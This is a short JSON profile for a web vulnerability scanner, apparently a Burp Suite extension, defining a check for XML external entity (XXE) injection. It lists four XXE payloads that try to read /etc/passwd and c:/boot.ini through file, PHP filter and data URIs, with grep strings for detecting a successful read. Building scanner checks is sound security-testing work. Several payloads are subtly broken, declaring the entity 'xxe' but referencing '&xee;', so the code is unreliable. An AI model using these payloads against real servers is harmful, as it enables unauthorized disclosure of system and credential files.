[{"Name":"XXE",
"Active":false,
"Scanner":1,
"Author":"@egarme",
"Payloads":["\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY\u003e\u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e]\u003e\u003cfoo\u003e\u0026xee;\u003c/foo\u003e",
"\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY\u003e\u003c!ENTITY xxe SYSTEM \"file://c:/boot.ini\"\u003e]\u003e\u003cfoo\u003e\u0026xee;\u003c/foo\u003e",
"\u003c!DOCTYPE foo [ \u003c!ENTITY % xxe SYSTEM \"data://text/plain;base64,
\nZmlsZTovLy9ldGMvcGFzc3dk\"\u003e]\u003e\u003cfoo/\u003e",
"\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource\u003d/etc/passwd\"\u003e]\u003e\u003cfoo\u003e\u0026xee;\u003c/foo\u003e"],
"Encoder":[],
"UrlEncode":false,
"CharsToUrlEncode":"",
"Grep":["root:x",
"boot loader",
"cm9vdD"],
"Tags":["XXE"],
"PayloadResponse":false,
"NotResponse":false,
"TimeOut":"",
"isTime":false,
"contentLength":"",
"iscontentLength":false,
"CaseSensitive":false,
"isReplace":false,
"Replace1":"",
"Replace2":"",
"ExcludeHTTP":false,
"OnlyHTTP":false,
"IsContentType":false,
"ContentType":"",
"NegativeCT":false,
"IsResponseCode":false,
"ResponseCode":"",
"NegativeRC":false,
"MatchType":1,
"RedirType":0,
"MaxRedir":0,
"spaceEncode":true,
"payloadPosition":1,
"sEncode":" ",
"payloadsFile":"",
"grepsFile":"",
"IssueName":"XXE",
"IssueSeverity":"High",
"IssueConfidence":"Tentative",
"IssueDetail":"XXE found",
"RemediationDetail":"",
"IssueBackground":"",
"RemediationBackground":""}]